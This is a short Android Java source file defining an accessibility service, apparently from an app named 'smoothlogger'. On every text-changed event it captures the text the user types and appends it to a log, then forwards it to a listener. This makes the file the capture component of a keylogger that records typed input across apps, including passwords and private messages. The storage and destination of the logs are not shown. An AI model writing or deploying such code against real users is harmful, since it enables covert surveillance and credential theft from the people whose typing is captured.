package com.smooth.smoothlogger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.util.List;

public class LoggerAccessibilityService extends AccessibilityService {
    private static LoggerAccessibilityService instance;
    private TextChangeListener textChangeListener;
    public static LoggerAccessibilityService getInstance() {
        return instance;
    }

    public void setTextChangeListener(TextChangeListener listener) {
        this.textChangeListener = listener;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> textList = event.getText();
            if (!textList.isEmpty()) {
                CharSequence text = textList.get(0);
                if (text != null) {
                    String typedText = text.toString();
                    Logger.appendLog(typedText);
                    if (textChangeListener != null) {
                        textChangeListener.onTextChanged(typedText);
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {

    }

}
